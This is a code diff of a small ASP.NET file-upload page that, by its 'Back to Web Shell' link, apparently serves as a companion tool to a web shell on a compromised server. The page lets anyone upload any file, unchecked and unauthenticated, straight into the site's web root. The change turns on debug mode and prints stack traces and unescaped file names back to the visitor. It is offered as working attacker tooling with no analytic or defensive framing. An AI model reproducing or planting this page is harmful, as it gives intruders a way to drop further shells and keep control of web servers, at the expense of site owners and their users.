@@ -1,45 +1,48 @@
-<%@ Page Language="C#" %>
+<%@ Page Language="C#" Debug="true" %>
 <html>
 <head>
-    <title>ASP.NET Uploader</title>
-    <style>body{font-family:monospace; background:#111; color:#0f0; padding:20px;}</style>
+    <title>Working Uploader</title>
+    <style>
+        body {font-family:monospace; background:#111; color:#0f0; padding:30px;}
+        pre {background:#222; padding:15px; color:yellow;}
+    </style>
 </head>
 <body>
-    <h2>Simple ASP.NET File Uploader</h2>
+    <h2>ASP.NET File Uploader (Working)</h2>
     
-    <form method="post" enctype="multipart/form-data" runat="server">
+    <form id="form1" method="post" enctype="multipart/form-data" runat="server">
         <asp:FileUpload ID="FileUpload1" runat="server" />
-        <asp:Button ID="UploadButton" runat="server" Text="Upload File" OnClick="UploadButton_Click" />
-        <br /><br />
-        <asp:Label ID="StatusLabel" runat="server" Text="" ForeColor="Yellow"></asp:Label>
+        <asp:Button ID="btnUpload" runat="server" Text="Upload File" OnClick="btnUpload_Click" />
+        <br><br>
+        <asp:Label ID="lblStatus" runat="server" ForeColor="Yellow" Font-Bold="true"></asp:Label>
     </form>
 
     <script runat="server">
-        protected void UploadButton_Click(object sender, EventArgs e)
+        protected void btnUpload_Click(object sender, EventArgs e)
         {
             if (FileUpload1.HasFile)
             {
                 try
                 {
-                    string filename = System.IO.Path.GetFileName(FileUpload1.FileName);
-                    string savePath = Server.MapPath("./") + filename;   // current folder mein save hoga
-                    
+                    string fileName = System.IO.Path.GetFileName(FileUpload1.FileName);
+                    string savePath = Server.MapPath("~/") + fileName;   // current folder
+
                     FileUpload1.SaveAs(savePath);
-                    StatusLabel.Text = "✅ Upload Successful: " + filename;
+                    lblStatus.Text = "✅ Upload Successful!<br>File: " + fileName;
                 }
                 catch (Exception ex)
                 {
-                    StatusLabel.Text = "❌ Error: " + ex.Message;
+                    lblStatus.Text = "❌ Error: " + ex.Message + "<br><br>Stack: " + ex.StackTrace;
                 }
             }
             else
             {
-                StatusLabel.Text = "No file selected.";
+                lblStatus.Text = "Please select a file first.";
             }
         }
     </script>
 
     <hr>
-    <a href="your_shell.asp">Back to Web Shell</a>
+    <a href="your_original_shell.asp">← Back to Shell</a>
 </body>
 </html>
